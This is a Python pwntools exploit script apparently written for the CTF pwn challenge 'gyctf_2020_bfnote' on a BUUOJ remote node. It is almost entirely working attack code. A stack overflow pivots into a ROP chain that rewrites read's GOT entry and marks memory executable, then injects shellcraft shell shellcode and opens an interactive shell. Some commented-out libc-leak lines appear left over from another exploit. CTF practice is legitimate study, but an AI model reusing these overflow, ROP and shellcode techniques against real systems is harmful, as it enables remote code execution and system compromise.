import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=process('./gyctf_2020_bfnote')
			io=process(['./gyctf_2020_bfnote'],env={'LD_PRELOAD':'../../i386libc/x86_libc.so.6'})
			elf=ELF('./gyctf_2020_bfnote')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',25170)
			elf=ELF('./gyctf_2020_bfnote')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		io.recv()
		pay='a'*0x32+'BBBB'+p32(0)+p32(0x804A064)
		io.send(pay)
		io.recv()
		pay=p32(elf.plt['read'])+p32(0x080489d9)+p32(0)+p32(elf.got['read'])+p32(2)+p32(elf.plt['read'])
		pay+=p32(0x804Ab0)+p32(0x804A000)+p32(0x1000)+p32(7)
		pay=pay.ljust(0x50,'\x00')
		pay+=asm(shellcraft.sh())

		io.send(pay)
		io.send(str(0x20000))
		io.recv()
		io.send(str(0x22000-0x8ec-0x18))
		io.recv()
		io.send('aaaa')
		io.recv()
		# gdb.attach(io)
		# pause()
		io.send('BBBBBBBB')
		io.recv()
		io.send('\xe1\x60')
		
		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue